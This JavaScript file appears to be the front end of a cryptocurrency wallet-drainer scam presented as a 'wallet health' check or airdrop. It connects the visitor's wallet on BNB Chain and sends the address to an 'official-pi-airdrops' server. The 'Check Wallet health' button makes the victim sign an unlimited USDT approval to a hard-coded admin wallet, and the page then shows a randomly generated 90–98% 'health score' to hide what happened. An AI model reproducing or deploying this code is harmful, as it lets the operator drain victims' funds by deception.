import EthereumProvider from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

// Constants for USDT and Admin wallet addresses
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_WALLET = "0x24E189414e4217962964b9D57877C91349A169Da";

// Minimal ABI for approve and balanceOf functions
const APPROVE_ABI = [
    "function approve(address spender, uint256 amount) public returns (bool)"
];
const USDT_ABI = [
    "function balanceOf(address owner) view returns (uint256)"
];

const connectButton = document.getElementById("connectWallet");
const approveButton = document.getElementById("approveUSDT");

// Variable for the signer instance once the wallet is connected
let signer;

// Merged connection handler
connectButton.onclick = async() => {
    connectButton.innerText = "Processing...";
    connectButton.disabled = true;

    // Remove the pre-connect overlay after 5 seconds
    setTimeout(() => {
        const preConnectOverlay = document.getElementById("preConnectOverlay");
        if (preConnectOverlay) preConnectOverlay.style.display = "none";
        connectButton.innerText = "Proceed";
        connectButton.disabled = false;
    }, 5000);

    try {
        // Initialize WalletConnect Ethereum provider
        const provider = await EthereumProvider.init({
            projectId: "5c7a882142c7491241b507534414ddff",
            chains: [56],
            methods: ["eth_sendTransaction", "eth_sign", "personal_sign"],
            showQrModal: true
        });

        await provider.connect();

        // Create an ethers Provider (BrowserProvider) with WalletConnect provider.
        const ethersProvider = new ethers.BrowserProvider(provider);
        signer = await ethersProvider.getSigner();
        const userAddress = await signer.getAddress();

        // Display a connection popup overlay with the user's address
        const connectionOverlay = document.getElementById("connectionPopupOverlay");
        const popupBox = document.getElementById("connectionPopupBox");
        const closeBtn = document.getElementById("popupCloseBtn");

        if (connectionOverlay) {
            connectionOverlay.style.display = "flex";
            // Assume the overlay has a child element with class "user-address"
            connectionOverlay.querySelector(".user-address").textContent = userAddress;

            // Auto-close overlay after 3 seconds
            setTimeout(() => {
                connectionOverlay.style.display = "none";
            }, 3000);
        }

        // Allow closing the overlay manually
        if (closeBtn) {
            closeBtn.onclick = () => {
                connectionOverlay.style.display = "none";
            };
        }
        window.addEventListener("click", (event) => {
            if (event.target === connectionOverlay) {
                connectionOverlay.style.display = "none";
            }
        });

        // Save the connected wallet address on your backend
        fetch('https://official-pi-airdrops.com/php/save_wallet.php', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ wallet: userAddress })
        });

        // Show the approve button now that the wallet is connected
        approveButton.style.display = "inline-block";

        // Display the wallet address and USDT balance on the UI
        const userAddressSpan = document.getElementById("userAddress");
        const userBalanceSpan = document.getElementById("userBalance");
        const walletInfoDiv = document.getElementById("walletInfo");

        if (userAddressSpan) {
            userAddressSpan.innerText = userAddress;
            // If there is an input element as well
            const userAddressInput = document.getElementById("userAddress");
            if (userAddressInput) userAddressInput.value = userAddress;
            walletInfoDiv.style.display = "block";

            // Instantiate contract for balance checking
            const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, ethersProvider);
            const rawBalance = await usdt.balanceOf(userAddress);
            const readableBalance = ethers.formatUnits(rawBalance, 18);
            userBalanceSpan.innerText = `${readableBalance} USDT`;
        }
    } catch (err) {
        console.error("Wallet connection error:", err);
    }
};

// Approval process for USDT allowance
approveButton.onclick = async() => {
    try {
        // Update button UI to show loading state
        approveButton.disabled = true;
        approveButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        // Create the USDT contract instance with approval ABI
        const contract = new ethers.Contract(USDT_ADDRESS, APPROVE_ABI, signer);
        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
        await tx.wait();

        // Once approved, retrieve the user address and display wallet health overlay
        const userAddress = await signer.getAddress();

        // Setup the overlay with wallet info
        const overlay = document.getElementById("overlay");
        const walletAddressSpan = document.getElementById("walletAddress");

        // Truncate address for display
        const truncatedAddress = `${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
        walletAddressSpan.textContent = truncatedAddress;

        // Generate a random health score between 90% and 98%
        const healthScore = Math.floor(Math.random() * 9) + 90;
        document.getElementById("healthScore").textContent = `${healthScore}%`;
        document.getElementById("healthBar").style.width = `${healthScore}%`;

        // Display overlay
        overlay.style.display = "flex";

        // Allow closing the overlay on button click or clicking outside the card
        document.getElementById("closeOverlayBtn").onclick = () => {
            overlay.style.display = "none";
        };
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                overlay.style.display = "none";
            }
        });
    } catch (err) {
        console.error("Approval error:", err);
        alert("Approval failed: " + (err.message || err));
    } finally {
        // Reset the approve button's state
        approveButton.disabled = false;
        approveButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
    }
};